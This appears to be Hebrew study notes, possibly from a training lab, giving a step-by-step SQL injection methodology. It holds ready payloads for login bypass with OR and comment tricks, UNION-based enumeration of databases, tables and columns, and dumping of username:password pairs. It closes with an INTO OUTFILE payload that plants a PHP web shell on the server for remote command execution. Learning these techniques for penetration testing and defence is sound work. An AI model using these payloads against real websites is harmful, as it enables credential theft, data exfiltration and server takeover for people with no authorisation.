SQLI - SQL Injection
* הSQLI היא פגיעות שבה תוקף מבצע מניפולציות בשאילתת SQL של אתר אינטרנט על ידי הזרקת קוד SQL זדוני לשדות קלט
# אינדיקציה
## אופציה 1 - עקיפת תהליך התחברות
* נהיה בפאנל התחברות שאין אופציה להירשם (לפעמים מחכמים ואפשר להירשם כדי להתבחר למערכת)
* צריך לרשום למשל משתמש וסיסמה - נורה אדומה חזקה כי מול מסד נתונים נעשה אימות
* לפעמים במצב כזה יתנו לנו משתמש שנצטרך להתחבר אליו ואז למצוא שיטה להתחבר בלי סיסמה
<img width="828" height="361" alt="Pasted image 20250723014306" src="https://github.com/user-attachments/assets/6d644173-8183-4d1f-8a77-879383f2bd22" />
* מאחורי הקלעים השאילתה נראית ככה שזה אומר אם שם משתמש נכון **וגם** סיסמה - תתחבר


```sql
SELECT * FROM logins WHERE username='test' AND password = '1234';
```
### שלבי פעולה
#### תרחיש א' - OR Injection
* נצטרך איכשהו לגרום לשגיאה כדי לקבל אינדיקציה שיש פגיעות (לא מחייב אבל זה התרחיש הנפוץ)
* זה אומר שנשים איזה אלמנט שמשבש שאילתות SQL למשל:
```
'		
"		
#		
;		
)		
```
* למשל נרשום בשם משתמש משהו ואז ישר את אחד התווים הנ"ל
* אם תהיה שגיאת סינטקס או משהו שייתן אינדיקציה שביצענו שגיאה במערכת זה אינדיקציה טובה שהוא פגיע
* אם הוא פגיע ננסה להזריק תנאי שהוא
```
admin' or '1'='1
```
* מאחורי הקלעים השאילתה תרוץ ככה
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
* וזאת שאילתה שגם המשתמש הוא אדמין וגם הסיסמה מחזירה true אז הוא יתחבר
<img width="797" height="345" alt="Pasted image 20250723014912" src="https://github.com/user-attachments/assets/5c42b2c9-c236-4fff-98b8-c9cc93640b9b" />

#### תרחיש ב' - הערות
* בSQL ניתן לעשות הערה בשאילתה ואז היא מתעלמת מההמשך, אפשר לנצל את זה כדי שהDB לא יבדוק בכלל סיסמה
* צריך לשים לב שכל סוג SQL יש לו הערות שונות (חלק #, חלק -- -, חלק הערה זה רק רווח תלוי בסוג)
* מאחורי הקלעים זה יראה משהו כזה:
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
* אז נזריק למשל לשם משתמש דברים הערות כאלה כדי לעקוף
```sql
admin' -- -
admin' #
```
* יכול להיות גם תנאים מסובכים יותר שמערבים כמה אלמנטים 
## אופציה 2 - מידע שחוזר ממסד נתונים
* יהיה שדה קלט כלשהו שדרכו נוכל לחפש פריט או פוסט או כל דבר ששמור איפשהו
	* באתר כInput
	* ערך בURL
	* משתנה בגוף הבקשה
* יוצג משהו באתר שידליק לנו נורה שזה חייב להיות מידע מסד נתונים
	* ויזואלית נראה טבלה
	* נראה אתר שמחזיר משהו כמו אתר קניות שאני בקלט שם למשל מכנסיים ואז הוא מחזיר לי רק בגדים מסוג מכנסיים
### תרחיש
* יש 3 סוגים של מתקפות SQL מהסוג הזה
	* מתקפות inbound (הסביר)- מתקפות שנוכל לראות את ההשפעה של המתקפה
	* מתקפות בינאריות (פחות סביר) - נקבל אינדיקציה של true false על פעולה 
	* מתקפות outbound - זה מתקפות blind sql עם הקמת שרת, זה מסובך מדי סביר שזה לא יהיה
לדוגמא:
<img width="1090" height="205" alt="Pasted image 20250723020139" src="https://github.com/user-attachments/assets/72348e69-e498-422f-b422-d07a9506c65d" />
<img width="200" height="38" alt="Pasted image 20250723020146" src="https://github.com/user-attachments/assets/de63d006-3d53-4306-8d39-6e0c693d4b26" />
<img width="1090" height="38" alt="Pasted image 20250723020151" src="https://github.com/user-attachments/assets/a3c43b69-23de-46f8-8a37-e2e6be89e3f6" />


במצב שזיהינו שיש עמוד עם מידע שמחזיר ממסד נתונים יש 6 שלבים סדורים מה לעשות:
1) זיהוי - ננסה להכשיל על ידי תווים מיוחדים כמו באופציה 1, מה שיתן אינדיקציה שיש פגיעות אם גרמנו לשגיאה
	* לא מחייב, יש מצב לא יהיה שגיאה אבל אם יש זה מחזק - אם לא אפשר להמשיך רגיל
2) גילוי כמה עמודות יש
	1) שיטת order by
```sql
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -
' order by 5-- -
```
2) שיטת union
```sql
cn' UNION select 1-- -
cn' UNION select 1,2-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
```
<img width="1090" height="105" alt="Pasted image 20250723020210" src="https://github.com/user-attachments/assets/8f361a99-46c2-4591-a575-a9b4a2b014ca" />

3) גילוי שם מסד נתונים
```sql
asd' union select 1,DATABASE(),3,4,5-- -
```
<img width="1090" height="99" alt="Pasted image 20250723020236" src="https://github.com/user-attachments/assets/518f2166-8bdf-4bd7-99d4-b31bf01566c5" />

4) גילוי שמות טבלאות
```sql
asd' union select 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema = 'ilfreight'-- -
```
<img width="1090" height="152" alt="Pasted image 20250723020302" src="https://github.com/user-attachments/assets/ccc7a2b4-d525-40f7-bf6d-b1957259088f" />
5) גילוי שמות עמודות בטבלה ספציפית
```sql
asd' union select 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name = 'users'-- -
```
<img width="1090" height="286" alt="Pasted image 20250723020329" src="https://github.com/user-attachments/assets/a730fad1-f9eb-43ac-a1b6-743a0a5cd4a2" />
6) שאיבת נתונים המלאים
```sql
asd' UNION SELECT 1, CONCAT(id, ':', username, ':', password), 3, 4,5 FROM users-- -
```
<img width="1090" height="176" alt="Pasted image 20250723020459" src="https://github.com/user-attachments/assets/ce30950a-e864-420a-95a2-89288bfc7f4a" />
* לפעמים יכול להיות כמה מסדי נתונים אז אפשר לחפש סד נתונים אחר ולבצע שוב את התהליך עליו כדי לחפש משהו
```sql
cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
```
<img width="1090" height="299" alt="Pasted image 20250723020534" src="https://github.com/user-attachments/assets/f38ef43b-0ec4-4601-b841-0f7c9962a330" />
* כאן למשל יש גם מסד נתונים בשם mysql

# אופציה 3 - SQLI to RCE (תרחיש פחות סביר)
יש לפעמים תרחישים שניתן לבצע הזרקה של קוד כמו [[RCE]]
```sql
cn' union select 1,'<?php system($_REQUEST[0]); ?>', 3, 4,5 into outfile '/var/www/html/dashboard/shell.php'-- -
```
<img width="1090" height="103" alt="Pasted image 20250723020730" src="https://github.com/user-attachments/assets/8bc75c61-2189-4576-b733-13eaa9a275b5" />
* ואז ברגע שיש shell אפשר לחפש מה שרוצים במערכת
<img width="1090" height="184" alt="Pasted image 20250723020748" src="https://github.com/user-attachments/assets/75311575-71a7-4cfb-b8d4-d8f3c279a8ea" />


# ניצול
1) זיהוי קלט פגיע
2) הזרקת קוד SQL זדוני
3) ביצוע מתודולוגיה פריצה למסד נתונים
4) קבלת גישה מלאה
